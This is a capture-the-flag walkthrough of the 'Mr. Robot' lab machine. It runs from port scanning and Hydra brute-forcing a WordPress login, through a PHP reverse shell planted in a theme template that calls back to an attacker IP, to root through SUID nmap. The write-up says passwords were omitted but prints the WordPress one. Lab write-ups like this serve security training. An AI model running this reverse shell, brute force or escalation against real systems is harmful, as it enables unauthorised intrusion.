## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

Credit to [Leon Johnson](https://twitter.com/@sho_luv) for creating this machine. **This machine is used here with the explicit permission of the creator <3**
```

## IP_Address
```IP_Address
10.10.243.87
```

## RustScan 
```bash
$ rustscan -a 10.10.243.87 -b 450 -t 2000 --ulimit 5000 -- -e tun0 
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 60
80/tcp  open  http    syn-ack ttl 60
443/tcp open  https   syn-ack ttl 60
```

## Port 80 
we Found Terminal based Webpage and after running all those commands we got nothing and then we surf to 
`http://10.10.243.87/robots.txt`
```Output
User-agent: *
fsocity.dic
key-1-of-3.txt
```
and then go to `http://10.10.243.87/key-1-of-3.txt` and got the first flag which is 
```Flag 
[flag omitted]
```

## Gobuster
Start scrolling or scanning the word-file
```bash
$ gobuster dir -u http://10.10.243.87 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t4  -x php,txt,bak 
/0                    (Status: 301) [Size: 0] [--> http://10.10.243.87/0/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.243.87/Image/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.243.87/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.243.87/feed/atom/]
/audio                (Status: 301) [Size: 234] [--> http://10.10.243.87/audio/]
/blog                 (Status: 301) [Size: 233] [--> http://10.10.243.87/blog/]
/css                  (Status: 301) [Size: 232] [--> http://10.10.243.87/css/]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.243.87/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.243.87/feed/]
/image                (Status: 301) [Size: 0] [--> http://10.10.243.87/image/]
/images               (Status: 301) [Size: 235] [--> http://10.10.243.87/images/]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.243.87/]
/index.html           (Status: 200) [Size: 1188]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.243.87/]
/intro                (Status: 200) [Size: 516314]
/js                   (Status: 301) [Size: 231] [--> http://10.10.243.87/js/]
/license              (Status: 200) [Size: 309]
/license.txt          (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://10.10.243.87/wp-login.php]
```
After getting the Wp-Login.php start use `BurpSuite` and then try to gain user name which allow to get into the admin dashboard
```burp-suite
POST /wp-login.php HTTP/1.1
Host: 10.10.67.70
Content-Length: 101
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.67.70
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.67.70/wp-login.php
Accept-Encoding: gzip, deflate, br
Cookie: s_fid=2CC9B006A499BAF8-1BA53E146B589DF1; s_nr=1753457316812; wordpress_test_cookie=WP+Cookie+check
Connection: keep-alive
log=Elliot&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.67.70%2Fwp-admin%2F&testcookie=1
```
This shows the user name is valid and allow us to get the password using the same file fir is ``
`fsocity.dic` and now lets try to get the password

We Got the Login page and after checking the login page found out that the `fsocity.dic` file contain the username which might be useful here so just try to run hydra to guess the password 
#hydra-wp-login 
```bash
$ hydra -l Elliot -P reverse.txt 10.10.67.70 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR" -V      
[ATTEMPT] target 10.10.67.70 - login "Elliot" - pass "2Fwiki" - 37 of 858235 [child 7] (0/0)
[ATTEMPT] target 10.10.67.70 - login "Elliot" - pass "3AUploadn" - 38 of 858235 [child 10] (0/0)
[ATTEMPT] target 10.10.67.70 - login "Elliot" - pass "SpecialUpload" - 39 of 858235 [child 0] (0/0)
[ATTEMPT] target 10.10.67.70 - login "Elliot" - pass "finding" - 40 of 858235 [child 15] (0/0)
[ATTEMPT] target 10.10.67.70 - login "Elliot" - pass "Instructions" - 41 of 858235 [child 3] (0/0)
[ATTEMPT] target 10.10.67.70 - login "Elliot" - pass "manager" - 42 of 858235 [child 13] (0/0)
[ATTEMPT] target 10.10.67.70 - login "Elliot" - pass "encountered" - 43 of 858235 [child 4] (0/0)
[80][http-post-form] host: 10.10.67.70   login: Elliot   password: ER28-0652
```
pass = ER28-0652
After login on web page there is the dashboard where we login as `Administrator` and we can edit between files so I simply go to 
dashboard > Appearences > Editor > 404.php template
and upload my reverse-shell.php payload
```payload
<?php
// shell.php - PHP Reverse Shell to 10.17.36.74:4444
$ip = '10.17.36.74';  // Attacker IP
$port = 4444;         // Listener Port
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```
and run on my terminal
```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.36.74] from (UNKNOWN) [10.10.67.70] 36802
ls
key-1-of-3.txt
you-will-never-guess-this-file-name.txt
cat you-will-never-guess-this-file-name.txt
hello there person who found me.
pwd
/opt/bitnami/apps/wordpress/htdocs
cd /home
ls
robot
ubuntu
cd robot
ls
key-2-of-3.txt
password.raw-md5
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
cat password.raw-md5
robot:[hash omitted]
```
after getting this I used crackstation.net to decrypt the md5-hash
`[hash omitted]` --output = `[password omitted]`
and then I tried to login using the SSH
```bash 
$ ssh robot@10.10.67.70
robot@10.10.67.70's password: [password omitted]
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
$ ls
key-2-of-3.txt  password.raw-md5
$ cat key-2-of-3.txt
[flag omitted]
```
Got the Second flag 
```2nd Flag
[flag omitted]
```
And then 
```bash
$ cd /root
-sh: 4: cd: can't cd to /root
$  find / -perm -4000 -type f 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
Here we find out about the Nmap that by default nmap will be running as sudo so run this 
```bash
$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
root@ip-10-10-67-70:~# 
```
## Boom Got The Root Shell
```bash
root@ip-10-10-67-70:/root# cat key-3-of-3.txt 
[flag omitted]
root@ip-10-10-67-70:/root# cat firstboot_done 
```
Got the Third Flag
```3rd Flag
[flag omitted]
```

# END
